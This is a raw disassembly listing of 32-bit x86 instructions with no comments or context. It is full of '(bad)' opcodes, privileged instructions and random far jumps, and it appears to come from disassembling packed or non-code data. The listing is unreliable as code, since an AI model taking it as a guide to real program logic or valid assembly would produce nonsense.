  4174ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4174f0:	call   0x8b9f208d
  4174f5:	stc    
  4174f6:	xor    BYTE PTR [edx],al
  4174f8:	or     ch,BYTE PTR [esi]
  4174fa:	cmp    DWORD PTR [ecx+ebx*4+0x2c4bdfee],0xfffffff4
  417502:	leave  
  417503:	xchg   BYTE PTR [ebp-0x1c9bbc8b],bh
  417509:	xor    DWORD PTR [ecx-0x2d70d8c],eax
  41750f:	mov    eax,0x5eaa13d9
  417514:	test   DWORD PTR [eax-0x40d04d9],esi
  41751a:	sahf   
  41751b:	fimul  WORD PTR [ecx]
  41751d:	add    edx,DWORD PTR [ecx]
  41751f:	dec    esi
  417520:	loopne 0x417564
  417522:	cli    
  417523:	lods   al,BYTE PTR ds:[esi]
  417524:	inc    ecx
  417525:	jge    0x41753a
  417527:	aaa    
  417528:	retf   0xc832
  41752b:	ret    
  41752c:	aad    0xa1
  41752e:	pop    esi
  41752f:	(bad)  
  417530:	repz fstp TBYTE PTR [esi-0x6603389e]
  417537:	mov    ecx,0x3ecc0883
  41753c:	xchg   esi,eax
  41753d:	xor    eax,edx
  41753f:	leave  
  417540:	fistp  WORD PTR [ecx+0x37b786b]
  417546:	std    
  417547:	xchg   esp,eax
  417548:	cmp    esi,DWORD PTR [ecx+edx*8+0x7dfa65a3]
  41754f:	pop    ebp
  417550:	aaa    
  417551:	jl     0x417529
  417553:	sar    BYTE PTR [ebx+0x74df0426],cl
  417559:	loope  0x41752d
  41755b:	push   0x308e6e1d
  417560:	popa   
  417561:	pop    ss
  417562:	out    0x1f,al
  417564:	imul   eax,DWORD PTR [ebp-0x120948ad],0xdab9c7cd
  41756e:	pop    ebx
  41756f:	in     al,0xf6
  417571:	add    al,0x4
  417573:	mov    esp,0xce4a24e0
  417578:	loope  0x41759f
  41757a:	inc    esi
  41757b:	repnz shl bl,1
  41757e:	push   eax
  41757f:	inc    edi
  417580:	(bad)  
  417581:	into   
  417582:	push   cs
  417583:	add    DWORD PTR [edi],ecx
  417585:	push   ecx
  417586:	or     dl,BYTE PTR [edx-0x8347a7c]
  41758c:	mov    eax,0x5fcb5abb
  417591:	fdiv   st,st(4)
  417593:	xchg   esi,eax
  417594:	pop    ds
  417595:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417596:	shl    DWORD PTR [esi+eiz*2-0x42fc12e6],cl
  41759d:	jne    0x41759e
  41759f:	iret   
  4175a0:	add    esi,ecx
  4175a2:	xor    dl,al
  4175a4:	mov    ds:0xe3555769,al
  4175a9:	and    ebx,ecx
  4175ab:	not    DWORD PTR [edi]
  4175ad:	and    al,0x43
  4175af:	sysret 
  4175b1:	sub    edi,DWORD PTR [ecx-0x79]
  4175b4:	aas    
  4175b5:	or     DWORD PTR [ebx-0x3c],esi
  4175b8:	into   
  4175b9:	xor    al,0xdd
  4175bb:	cli    
  4175bc:	outs   dx,BYTE PTR ds:[esi]
  4175bd:	fcom   QWORD PTR [edi]
  4175bf:	sub    al,0x67
  4175c1:	repz shl edx,0xb8
  4175c5:	jo     0x41760c
  4175c7:	pop    ss
  4175c8:	cmp    BYTE PTR [ecx-0x7a],bh
  4175cb:	rcr    ch,1
  4175cd:	loopne 0x4175f3
  4175cf:	adc    cl,dh
  4175d1:	pop    ss
  4175d2:	pop    es
  4175d3:	push   esi
  4175d4:	xchg   edi,eax
  4175d5:	jo     0x41758c
  4175d7:	nop
  4175d8:	(bad)  
  4175d9:	jbe    0x41755d
  4175db:	pop    ecx
  4175dc:	popa   
  4175dd:	push   0x40ba1fa8
  4175e2:	ins    BYTE PTR es:[edi],dx
  4175e3:	(bad)  
  4175e4:	retf   
  4175e5:	repz inc ecx
  4175e7:	aad    0xd
  4175e9:	mov    dh,0xb1
  4175eb:	and    al,0x40
  4175ed:	out    dx,eax
  4175ee:	and    esi,0x5a8c342c
  4175f4:	jnp    0x4175b5
  4175f6:	or     al,0xcb
  4175f8:	int3   
  4175f9:	mov    WORD PTR [eax+eax*8+0x3144e224],?
  417600:	mov    ?,WORD PTR [esi]
  417602:	xor    eax,0xec1f2763
  417607:	loop   0x4175b0
  417609:	out    0x6c,eax
  41760b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41760c:	out    0x55,eax
  41760e:	push   es
  41760f:	stos   BYTE PTR es:[edi],al
  417610:	push   cs
  417611:	xor    ch,BYTE PTR [edi+esi*1]
  417614:	bound  esp,QWORD PTR [esi+eax*8-0x25a5d4a1]
  41761b:	dec    esi
  41761c:	mov    ecx,esp
  41761e:	add    al,0x42
  417620:	rol    BYTE PTR [ecx],0xbd
  417623:	faddp  st(3),st
  417625:	add    dl,BYTE PTR [edx-0x15]
  417628:	mov    dh,0x6d
  41762a:	sub    ebx,ecx
  41762c:	lock cs push edx
  41762f:	les    ecx,FWORD PTR [edx]
  417631:	mov    ebp,0x16330707
  417636:	call   0x14ea:0x6e32cade
  41763d:	pop    ebx
  41763e:	mov    ch,0x35
  417640:	rol    DWORD PTR [eax],1
  417642:	xchg   ebp,eax
  417643:	push   ds
  417644:	in     al,0x75
  417646:	pop    ebx
  417647:	mov    BYTE PTR [esp+ebp*4-0x13],dh
  41764b:	gs ins DWORD PTR es:[edi],dx
  41764d:	enter  0x9c93,0x8
  417651:	hlt    
  417652:	inc    ebp
  417653:	(bad)  
  417655:	jmp    0x4175ed
  417657:	mov    al,0xf6
  417659:	mov    eax,ds:0xe136d9cf
  41765e:	rcl    DWORD PTR [ecx],1
  417660:	jecxz  0x417614
  417662:	stos   DWORD PTR es:[edi],eax
  417663:	push   ecx
  417664:	push   eax
  417665:	dec    esp
  417666:	ret    
  417667:	mov    al,ds:0xfe4d1d22
  41766c:	jl     0x41769d
  41766e:	icebp  
  41766f:	lahf   
  417670:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417671:	lahf   
  417672:	gs push ebp
  417674:	dec    edx
  417675:	mov    edi,0xb116a95e
  41767a:	loopne 0x41760e
  41767c:	(bad)  
  41767d:	aas    
  41767e:	mov    eax,ds:0x4799b86d
  417683:	cmp    al,0x7c
  417685:	cmp    bh,BYTE PTR [esi+0x6fcb71d0]
  41768b:	ds dec edi
  41768d:	lock ja 0x41770a
  417690:	fcmovb st,st(3)
  417692:	and    eax,0x8f96a28c
  417697:	jno    0x4176c1
  417699:	ss inc edx
  41769b:	cmc    
  41769c:	mov    ebx,0xca9a8b30
  4176a1:	mov    esi,0xdd56e2fd
  4176a6:	jecxz  0x4176c4
  4176a8:	sahf   
  4176a9:	pop    esp
  4176aa:	pop    esi
  4176ab:	and    BYTE PTR [edx+0x4f],0x3b
  4176af:	and    eax,0x83ac342e
  4176b4:	adc    al,0xd
  4176b6:	cmp    ebp,DWORD PTR [esi]
  4176b8:	fdivrp st(6),st
  4176ba:	adc    cl,bl
  4176bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4176bd:	fidivr DWORD PTR [edx+eiz*2]
  4176c0:	std    
  4176c1:	lds    edx,FWORD PTR [ecx]
  4176c3:	xor    al,0x39
  4176c5:	jne    0x4176b0
  4176c7:	(bad)
  4176ca:	rol    DWORD PTR [esi],cl
  4176cc:	jg     0x4176b6
  4176ce:	js     0x4176a4
  4176d0:	xchg   esp,eax
  4176d1:	lahf   
  4176d2:	or     al,0x20
  4176d4:	hlt    
  4176d5:	mov    dh,0x46
  4176d7:	sbb    eax,0x839a62ca
  4176dc:	cmc    
  4176dd:	sbb    DWORD PTR [ebx+edx*8-0x5a5672a1],ebp
  4176e4:	mov    BYTE PTR [eax-0x73],dh
  4176e7:	dec    ecx
  4176e8:	pop    edi
  4176e9:	xchg   esi,eax
  4176ea:	cdq    
  4176eb:	push   edx
  4176ec:	inc    edi
  4176ed:	inc    esi
  4176ee:	into   
  4176ef:	xchg   bh,ah
  4176f1:	(bad)  
  4176f2:	mov    esp,0xf4823e2a
  4176f7:	jecxz  0x417749
  4176f9:	or     eax,0xee426b06
  4176fe:	push   ds
  4176ff:	nop
  417700:	sbb    eax,0x3667a452
  417705:	mov    BYTE PTR [esi+0xf],bh
  417708:	and    al,0x15
  41770a:	inc    ebx
  41770b:	cmp    ah,BYTE PTR [ecx-0x3f]
  41770e:	add    al,0xa9
  417710:	mov    fs,WORD PTR ds:0x842d3d79
  417716:	xchg   esi,eax
  417717:	stos   BYTE PTR es:[edi],al
  417718:	mov    ds:0x2ff73e2c,eax
  41771d:	pusha  
  41771e:	inc    ebx
  41771f:	push   esi
  417720:	xchg   ebp,eax
  417721:	mov    ah,0x6d
  417723:	sub    esp,DWORD PTR [edi+0xb]
  417726:	lods   eax,DWORD PTR ds:[esi]
  417727:	imul   edi,edx,0xffffff99
  41772a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41772b:	pop    ebx
  41772c:	sbb    dh,BYTE PTR [ecx-0x38]
  41772f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417730:	xchg   DWORD PTR [ebx+0x462d40a8],ebp
  417736:	ins    BYTE PTR es:[edi],dx
  417737:	in     eax,0x57
  417739:	fidivr WORD PTR [esp+edi*2]
  41773c:	xchg   edx,eax
  41773d:	test   al,0x84
  41773f:	xchg   si,ax
  417741:	cmp    eax,0xa8e49654
  417746:	mov    ebp,0xb26b5e12
  41774b:	inc    esp
  41774c:	fwait
  41774d:	or     ebp,esi
  41774f:	mov    eax,0xfdca3835
  417754:	push   esi
  417755:	out    dx,eax
  417756:	stos   DWORD PTR es:[edi],eax
  417757:	in     eax,0x54
  417759:	xchg   DWORD PTR [ecx-0x2f63cb97],ebx
  41775f:	adc    eax,0x3bdc35f7
  417764:	push   0xffffff82
  417766:	pop    ss
  417767:	les    ebx,FWORD PTR ds:0xa2bf229e
  41776d:	jle    0x41770b
  41776f:	sbb    BYTE PTR [ebp-0x4063394d],bl
  417775:	mov    bh,0x3
  417777:	dec    edi
  417778:	test   eax,0xe5673c6d
  41777d:	xchg   ecx,eax
  41777e:	bound  ebx,QWORD PTR [eax-0x1f]
  417781:	ins    DWORD PTR es:[edi],dx
  417782:	inc    esi
  417783:	jae    0x417756
  417785:	shr    DWORD PTR [edi+esi*8],0xb0
  417789:	sub    ecx,DWORD PTR [edx]
  41778b:	mov    ecx,esi
  41778d:	retf   0x3827
  417790:	pop    esp
  417791:	xchg   BYTE PTR [ecx+eiz*2+0x2e30b0],cl
  417798:	pop    ecx
  417799:	jbe    0x41772b
  41779b:	cmp    al,0xde
  41779d:	jne    0x417740
  41779f:	cdq    
  4177a0:	mov    ebx,0x42b612c7
  4177a5:	push   eax
  4177a6:	sbb    eax,0x9409f6b3
  4177ab:	ror    BYTE PTR [eax+0x267635b5],1
  4177b1:	ret    0xe6bd
  4177b4:	nop
  4177b5:	jb     0x417810
  4177b7:	or     edx,DWORD PTR [esi-0x47]
  4177ba:	sub    bl,BYTE PTR [ebx+0x2295db9]
  4177c0:	xor    al,0xe0
  4177c2:	stos   DWORD PTR es:[edi],eax
  4177c3:	cmp    eax,0x543b782d
  4177c8:	test   eax,0xafb88209
  4177cd:	ss shr ebp,1
  4177d0:	setp   BYTE PTR [edi-0x48]
  4177d4:	out    dx,al
  4177d5:	add    eax,0xbb4c96c7
  4177da:	xor    esi,DWORD PTR [esi+0x38c03159]
  4177e0:	arpl   WORD PTR [eax],sp
  4177e2:	sub    BYTE PTR [ebx+eiz*2-0x3837ac80],bl
  4177e9:	outs   dx,BYTE PTR ds:[esi]
  4177ea:	les    edx,FWORD PTR [edx]
  4177ec:	inc    edi
  4177ed:	mov    DWORD PTR [edx+0x568b3147],edi
  4177f3:	and    DWORD PTR [eax+ebp*1+0x350814ee],ecx
  4177fa:	jmp    0x4177db
  4177fc:	mov    cl,0xc6
  4177fe:	mov    ecx,0xc9c3b27f
  417803:	ja     0x41783e
  417805:	jg     0x41781e
  417807:	(bad)  
  417808:	stos   DWORD PTR es:[edi],eax
  417809:	nop
  41780a:	pop    ecx
  41780b:	add    eax,0x5b44a871
  417810:	fs repz push esi
  417813:	dec    esi
  417814:	xchg   ebp,eax
  417815:	icebp  
  417816:	sahf   
  417817:	fwait
  417818:	mov    eax,0xe7ef6bc5
  41781d:	leave  
  41781e:	jecxz  0x417806
  417820:	test   DWORD PTR [ebx-0x9],eax
  417823:	lods   al,BYTE PTR ds:[esi]
  417824:	not    bl
  417826:	inc    edx
  417827:	sar    DWORD PTR [ebx+edx*2],0x6f
  41782b:	cmp    eax,0x9c22766f
  417830:	and    DWORD PTR [ecx+0x47],esi
  417833:	xor    eax,ecx
  417835:	mov    eax,0x7c8432cb
  41783a:	push   ebp
  41783b:	int    0xf
  41783d:	pusha  
  41783e:	and    dl,BYTE PTR ds:0x2ec1b23
  417844:	or     DWORD PTR [ecx-0x5c],ecx
  417847:	nop
  417848:	push   ebx
  417849:	pop    edx
  41784a:	test   al,0xa8
  41784c:	inc    esp
  41784d:	dec    ebx
  41784e:	pop    edi
  41784f:	mov    ch,0xba
  417851:	jl     0x417842
  417853:	into   
  417854:	jmp    0x72fa820
  417859:	cmc    
  41785a:	xor    BYTE PTR [edi-0x23bc00f3],0x72
  417861:	outs   dx,BYTE PTR ds:[esi]
  417862:	pop    edx
  417863:	jno    0x4178ce
  417865:	lds    edx,FWORD PTR [edx]
  417867:	sahf   
  417868:	jmp    0x29a557bf
  41786d:	cmp    eax,0xfddbdbdb
  417872:	ins    DWORD PTR es:[edi],dx
  417873:	sahf   
  417874:	inc    edi
  417875:	jge    0x417894
  417877:	into   
  417878:	scas   eax,DWORD PTR es:[edi]
  417879:	xchg   ebp,eax
  41787a:	in     eax,dx
  41787b:	or     al,0xb3
  41787d:	and    dh,bh
  41787f:	dec    edx
  417880:	ret    
  417881:	cs adc ch,dh
  417884:	sub    BYTE PTR [eax+0x6c93d256],ch
  41788a:	(bad)  
  41788c:	lahf   
  41788d:	outs   dx,DWORD PTR ds:[esi]
  41788e:	jg     0x417871
  417890:	and    al,0xd6
  417892:	imul   ecx
  417894:	cmp    DWORD PTR ds:0xd7df0b2b,ebp
  41789a:	push   eax
  41789b:	sbb    al,0xd
  41789d:	outs   dx,DWORD PTR ds:[esi]
  41789e:	shl    BYTE PTR [ebx+0x6e],1
  4178a1:	push   ss
  4178a2:	add    BYTE PTR [edx+0x60],bh
  4178a5:	mov    edi,0x72f619bd
  4178aa:	and    al,BYTE PTR [edx+0x3111f337]
  4178b0:	daa    
  4178b1:	bound  ebx,QWORD PTR [eax-0x6fe64d74]
  4178b7:	jb     0x4178f7
  4178b9:	mov    ecx,0x28e8ef58
  4178be:	retf   0xcb25
  4178c1:	popf   
  4178c2:	fimul  WORD PTR [eax-0x5b5042fa]
  4178c8:	stos   DWORD PTR es:[edi],eax
  4178c9:	(bad)  
  4178ca:	jnp    0x4178c0
  4178cc:	xchg   edi,eax
  4178cd:	mov    BYTE PTR [ecx-0x22],bl
  4178d0:	xlat   BYTE PTR ds:[ebx]
  4178d1:	ins    DWORD PTR es:[edi],dx
  4178d2:	mov    ebx,0xde2c3d1c
  4178d7:	mov    esi,0xbe96941a
  4178dc:	pop    DWORD PTR [esi]
  4178de:	mov    ch,0xa0
  4178e0:	ja     0x41795b
  4178e2:	fbld   TBYTE PTR [ebx]
  4178e4:	dec    ebp
  4178e5:	xchg   bh,al
  4178e7:	pusha  
  4178e8:	leave  
  4178e9:	call   0x393bcc16
  4178ee:	push   0xffffffda
  4178f0:	mov    dl,BYTE PTR [eax-0x6a]
  4178f3:	aaa    
  4178f4:	add    eax,0xaa471173
  4178f9:	jo     0x417890
  4178fb:	push   0x2d
  4178fd:	mov    ds:0xb0732da8,al
  417902:	or     DWORD PTR [ecx],eax
  417904:	sti    
  417905:	fist   WORD PTR [eax-0x7f]
  417908:	popf   
  417909:	xchg   ecx,eax
  41790a:	das    
  41790b:	not    BYTE PTR [ebp+0x42]
  41790e:	aad    0x36
  417910:	push   es
  417911:	sbb    esp,DWORD PTR [ecx-0x29]
  417914:	(bad)  
  417916:	fld    st(1)
  417918:	sub    al,0xe9
  41791a:	loop   0x4178fd
  41791c:	clc    
  41791d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41791e:	mov    cl,bh
  417920:	(bad)  
  417921:	cwde   
  417922:	fwait
  417923:	shrd   edi,ebp,cl
  417926:	arpl   WORD PTR [ecx-0x5f46425e],ax
  41792c:	inc    ecx
  41792d:	mov    eax,0x1669fb56
  417932:	ret    
  417933:	mov    ch,0x8
  417935:	repz shl BYTE PTR ds:0x86339fa7,1
  41793c:	out    0x70,eax
  41793e:	icebp  
  41793f:	cmp    dl,BYTE PTR [eax-0x2963e019]
  417945:	pusha  
  417946:	adc    edx,DWORD PTR [edx+0x1ce428df]
  41794c:	cmp    bh,BYTE PTR [edx]
  41794e:	ror    edx,cl
  417950:	push   edi
  417951:	outs   dx,BYTE PTR ds:[esi]
  417952:	inc    ecx
  417953:	stos   DWORD PTR es:[edi],eax
  417954:	push   cs
  417955:	data16 mov ch,0xdd
  417958:	adc    DWORD PTR [ecx+0x7d],ebp
  41795b:	fst    DWORD PTR [edx+0x675c740a]
  417961:	fs mov dh,0x5e
  417964:	stos   BYTE PTR es:[edi],al
  417965:	inc    ebp
  417966:	cmc    
  417967:	loopne 0x417965
  417969:	xchg   esp,eax
  41796a:	mov    bh,0x74
  41796c:	cmp    DWORD PTR [ebx+0x9],ebx
  41796f:	inc    eax
  417970:	push   ebx
  417971:	lods   eax,DWORD PTR ds:[esi]
  417972:	ins    DWORD PTR es:[edi],dx
  417973:	sub    DWORD PTR [edx],edx
  417975:	pop    ecx
  417976:	mov    ebx,0xe387bb6
  41797b:	push   0x55
  41797d:	dec    edi
  41797e:	dec    esp
  41797f:	jnp    0x4179e1
  417981:	push   0x63
  417983:	ins    BYTE PTR es:[edi],dx
  417984:	icebp  
  417985:	call   0x3e76f144
  41798a:	jb     0x4179d1
  41798c:	mov    ds:0xe0b504a7,eax
  417991:	scas   eax,DWORD PTR es:[edi]
  417992:	out    0x2d,al
  417994:	and    al,0xcd
  417996:	aas    
  417997:	cmc    
  417998:	int    0x2b
  41799a:	in     al,0x78
  41799c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41799d:	jbe    0x4179e3
  41799f:	jge    0x417930
  4179a1:	mov    eax,0x21e3238b
  4179a6:	jge    0x4179ca
  4179a8:	and    BYTE PTR [ebp+0x6],ch
  4179ab:	push   eax
  4179ac:	pop    ebx
  4179ad:	fiadd  WORD PTR [ebx]
  4179af:	fnsave [edi+0x70ddc9d6]
  4179b5:	mov    BYTE PTR [eax+ecx*4],bh
  4179b8:	nop
  4179b9:	add    ebp,DWORD PTR [edx-0x77]
  4179bc:	out    dx,al
  4179bd:	aaa    
  4179be:	mov    ch,0x6f
  4179c0:	sbb    ebx,ecx
  4179c2:	adc    BYTE PTR [ebx-0x314f3b6],0xaa
  4179c9:	jle    0x4179c2
  4179cb:	push   ds
  4179cc:	mov    eax,0x328cc662
  4179d1:	int3   
  4179d2:	sbb    eax,0xe5ceb9d8
  4179d7:	mov    cl,0x57
  4179d9:	xchg   esi,eax
  4179da:	inc    esi
  4179db:	dec    ebx
  4179dc:	int    0xf5
  4179de:	jg     0x417a5f
  4179e0:	fisubr WORD PTR [eax+0x2c]
  4179e3:	nop
  4179e4:	cmc    
  4179e5:	push   ds
  4179e6:	mov    ah,0x1
  4179e8:	add    edi,DWORD PTR [ebx]
  4179ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4179eb:	pop    ecx
  4179ec:	inc    edi
  4179ed:	push   ss
  4179ee:	xchg   edx,eax
  4179ef:	inc    eax
  4179f0:	js     0x417a69
  4179f2:	leave  
  4179f3:	shr    BYTE PTR [eax],0x71
  4179f6:	mov    bh,0xc4
  4179f8:	pop    ecx
  4179f9:	sbb    al,0x12
  4179fb:	push   es
  4179fc:	cmp    edi,DWORD PTR [edx-0x53e0f422]
  417a02:	jge    0x417a83
  417a04:	xchg   ecx,eax
  417a05:	xchg   esi,eax
  417a06:	xor    ah,BYTE PTR [eax-0x6e6298f3]
  417a0c:	int    0x3a
  417a0e:	enter  0x6461,0x9
  417a12:	std    
  417a13:	fwait
  417a14:	lods   eax,DWORD PTR ds:[esi]
  417a15:	sub    BYTE PTR [esp+eiz*8],bh
  417a18:	aas    
  417a19:	xor    esi,eax
  417a1b:	mov    ebp,0xc9298c14
  417a20:	adc    BYTE PTR [edx+0x437e32a6],bh
  417a26:	jns    0x4179e7
  417a28:	mov    esi,0x98775ce0
  417a2d:	push   0xe09e5bb1
  417a32:	xor    ah,BYTE PTR [ecx-0x494d0a3a]
  417a38:	stos   DWORD PTR es:[edi],eax
  417a39:	popf   
  417a3a:	jecxz  0x417a3e
  417a3c:	sbb    BYTE PTR [edx+0x67],cl
  417a3f:	rdtsc  
  417a41:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417a42:	xchg   ah,ah
  417a44:	or     BYTE PTR [ebx+edx*2-0x63b1397f],ah
  417a4b:	in     al,dx
  417a4c:	and    bh,BYTE PTR [esi+0x9]
  417a4f:	lea    eax,[eax+0x3d]
  417a52:	jbe    0x417ac9
  417a54:	stos   BYTE PTR es:[edi],al
  417a55:	xor    BYTE PTR [edx],bh
  417a57:	stc    
  417a58:	loop   0x417a58
  417a5a:	push   ebp
  417a5b:	dec    ebp
  417a5c:	hlt    
  417a5d:	inc    esi
  417a5e:	pop    esp
  417a5f:	rcr    BYTE PTR [edi-0x41],0x5e
  417a63:	dec    esp
  417a64:	adc    eax,0xe00712ef
  417a69:	cld    
  417a6a:	shl    ah,0x68
  417a6d:	lds    ebx,FWORD PTR [ebp+0x5a]
  417a70:	gs add eax,0xc3f2fc9f
  417a76:	rol    BYTE PTR [ebp+0x67],cl
  417a79:	cmp    bl,BYTE PTR [esi]
  417a7b:	int3   
  417a7c:	xchg   ecx,eax
  417a7d:	adc    DWORD PTR [ebp+0x5b],ebx
  417a80:	mov    esi,0x26458ed7
  417a85:	sbb    BYTE PTR [esi+0x32],ah
  417a88:	pop    ss
  417a89:	adc    al,0x8a
  417a8b:	sti    
  417a8c:	adc    BYTE PTR [eax-0x190518c4],cl
  417a92:	sub    al,0x71
  417a94:	imul   edi,esi,0xb0f4530c
  417a9a:	fiadd  DWORD PTR [ecx+edx*2-0x22]
  417a9e:	cmp    DWORD PTR [ebx+0x56189e7d],0xc7f60847
  417aa8:	cmp    al,0x3b
  417aaa:	xchg   ebp,eax
  417aab:	inc    ebp
  417aac:	sti    
  417aad:	cmc    
  417aae:	sbb    eax,DWORD PTR [edx+0x63]
  417ab1:	in     eax,0xe6
  417ab3:	adc    BYTE PTR [ecx],cl
  417ab5:	shl    al,1
  417ab7:	pushf  
  417ab8:	xor    dl,ch
  417aba:	mov    edx,0xfd0aed12
  417abf:	outs   dx,DWORD PTR ds:[esi]
  417ac0:	std    
  417ac1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417ac2:	push   esp
  417ac3:	stc    
  417ac4:	dec    ebx
  417ac5:	xor    BYTE PTR [ecx],bh
  417ac7:	cmp    edi,DWORD PTR [ebp-0x46b51ca9]
  417acd:	adc    eax,0xd1cec4d
  417ad2:	and    BYTE PTR [ebx+0x114eeaf2],bh
  417ad8:	test   DWORD PTR [ebp-0x2e],ecx
  417adb:	pop    edi
  417adc:	sti    
  417add:	and    edi,DWORD PTR [esi+0x35c7c48d]
  417ae3:	jmp    0x1bc43871
  417ae8:	push   esp
  417ae9:	mov    al,ds:0x17293e2e
  417aee:	mov    al,0xe7
  417af0:	ror    esi,0xdf
  417af3:	xor    BYTE PTR es:[ebx+edi*8+0x68],ch
  417af8:	mov    BYTE PTR [edx],dh
  417afa:	jns    0x417a7f
  417afc:	dec    ebp
  417afd:	in     eax,dx
  417afe:	jmp    0x191b669e
  417b03:	test   eax,0xf4a2e741
  417b08:	inc    ebx
  417b09:	or     edx,DWORD PTR [edx]
  417b0b:	add    eax,ebx
  417b0d:	mov    esp,0x8032eb5
  417b12:	(bad)  
  417b13:	or     eax,ebp
  417b15:	mul    BYTE PTR [ecx+ebx*8-0x3ddb40a9]
  417b1c:	inc    ebx
  417b1d:	mov    dh,BYTE PTR [edx+0x74fb957a]
  417b23:	ret    
  417b24:	arpl   cx,si
  417b26:	imul   ebx,DWORD PTR [esi],0x18
  417b29:	retf   
  417b2a:	rcl    esi,1
  417b2c:	add    BYTE PTR ds:0x37fc4815,dh
  417b32:	push   edi
  417b33:	add    al,0xa0
  417b35:	ins    DWORD PTR es:[edi],dx
  417b36:	dec    edi
  417b37:	mov    eax,0xbe9fd782
  417b3c:	jp     0x417b08
  417b3e:	arpl   WORD PTR [ebx-0x5d],sp
  417b41:	(bad)  
  417b42:	les    edi,FWORD PTR [ebp+ecx*1+0x77c7fd6d]
  417b49:	jbe    0x417ba1
  417b4b:	nop
  417b4c:	and    ah,BYTE PTR [esi+eax*4-0x32]
  417b50:	or     al,0x2e
  417b52:	stos   BYTE PTR es:[edi],al
  417b53:	aaa    
  417b54:	ret    
  417b55:	pop    esi
  417b56:	rcl    edx,0x9d
  417b59:	fbld   TBYTE PTR [ebx-0x23]
  417b5c:	inc    ebp
  417b5d:	adc    ecx,0xf421d0cd
  417b63:	mov    al,0x4a
  417b65:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417b66:	cld    
  417b67:	aad    0x25
  417b69:	outs   dx,BYTE PTR ds:[esi]
  417b6a:	mov    ebp,0xe92fda35
  417b6f:	out    dx,eax
  417b70:	xor    al,BYTE PTR [esi-0x1fac5eed]
  417b76:	xor    eax,0x9426b4b3
  417b7b:	mov    edx,0x29da2b8e
  417b80:	jo     0x417b6f
  417b82:	push   ds
  417b83:	pop    edx
  417b84:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417b85:	and    al,0x9d
  417b87:	outs   dx,BYTE PTR fs:[esi]
  417b89:	jecxz  0x417b7f
  417b8b:	sbb    al,0x87
  417b8d:	js     0x417bcd
  417b8f:	fs stos DWORD PTR es:[edi],eax
  417b91:	sub    DWORD PTR ds:0x9c3a46b,ebp
  417b97:	pop    ds
  417b98:	cdq    
  417b99:	pop    edi
  417b9a:	add    al,0x2a
  417b9c:	fld    QWORD PTR ds:0xdea0777
  417ba2:	lds    ebx,FWORD PTR ds:0x169a4580
  417ba8:	nop
  417ba9:	and    BYTE PTR [ecx],0x5
  417bac:	cmp    ebp,0x7b3fd8ee
  417bb2:	leave  
  417bb3:	out    0xc,al
  417bb5:	sbb    ch,BYTE PTR [ecx-0x11a24d46]
  417bbb:	jmp    0x6cb4:0x7541664e
  417bc2:	pushf  
  417bc3:	push   ebx
  417bc4:	aam    0x4e
  417bc6:	div    cl
  417bc8:	pop    ss
  417bc9:	int    0xa9
  417bcb:	ret    
  417bcc:	cmp    esp,edi
  417bce:	push   ebp
  417bcf:	or     BYTE PTR [edx+0x5df11cf7],cl
  417bd5:	xlat   BYTE PTR ds:[bx]
  417bd7:	inc    ebp
  417bd8:	push   ss
  417bd9:	jmp    0x3a7d18b4
  417bde:	xor    DWORD PTR [ecx+0x28d7e68b],ebx
  417be4:	mov    ss,WORD PTR ds:0x72c359de
  417bea:	inc    eax
  417beb:	bound  ebp,QWORD PTR [ebp-0x3f027904]
  417bf1:	cmp    edx,DWORD PTR [eax+0x21]
  417bf4:	xlat   BYTE PTR ds:[ebx]
  417bf5:	shl    DWORD PTR [edx+0x6d],1
  417bf8:	jnp    0x417b7e
  417bfa:	fcmovb st,st(2)
  417bfc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417bfd:	jg     0x417c4f
  417bff:	adc    BYTE PTR [edi-0x3a],0xdb
  417c03:	add    eax,0x6ee10396
  417c08:	xchg   ebp,eax
  417c09:	jb     0x417bf4
  417c0b:	mov    dl,0x62
  417c0d:	stos   DWORD PTR es:[edi],eax
  417c0e:	mov    ch,BYTE PTR [edx-0x50e60330]
  417c14:	inc    esp
  417c15:	cdq    
  417c16:	scas   al,BYTE PTR es:[edi]
  417c17:	sar    ecx,1
  417c19:	idiv   DWORD PTR [eax-0x4e]
  417c1c:	and    al,0xaa
  417c1e:	loope  0x417bf2
  417c20:	jle    0x417c5f
  417c22:	scas   al,BYTE PTR es:[edi]
  417c23:	push   edx
  417c24:	or     dh,al
  417c26:	push   esp
  417c27:	arpl   WORD PTR [ecx-0x3d],ax
  417c2a:	dec    ebp
  417c2b:	mov    WORD PTR [eax-0x4ebedd5f],cs
  417c31:	fst    DWORD PTR [ecx+0x323aac]
  417c37:	je     0x417c92
  417c39:	mov    BYTE PTR [esi+0x70be0c4],cl
  417c3f:	ja     0x417c7a
  417c41:	stc    
  417c42:	jno    0x417bff
  417c44:	and    esi,DWORD PTR [esi]
  417c46:	outs   dx,DWORD PTR ds:[esi]
  417c47:	js     0x417c51
  417c49:	enter  0x6279,0x62
  417c4d:	xchg   esi,eax
  417c4e:	pushf  
  417c4f:	fst    DWORD PTR [ebp-0xf]
  417c52:	dec    ebx
  417c53:	test   BYTE PTR [ecx-0x1e],0xab
  417c57:	js     0x417c4f
  417c59:	loopne 0x417c97
  417c5b:	loop   0x417c70
  417c5d:	mov    ch,0x9e
  417c5f:	stc    
  417c60:	pop    ebp
  417c61:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417c62:	jb     0x417c07
  417c64:	mov    ch,0xa0
  417c66:	aam    0x88
  417c68:	repz push ss
  417c6a:	inc    ecx
  417c6b:	dec    edx
  417c6c:	call   0x6a77:0x91448faa
  417c73:	pop    ds
  417c74:	adc    dh,cl
  417c76:	(bad)  
  417c78:	retf   0x1568
  417c7b:	lods   al,BYTE PTR ds:[esi]
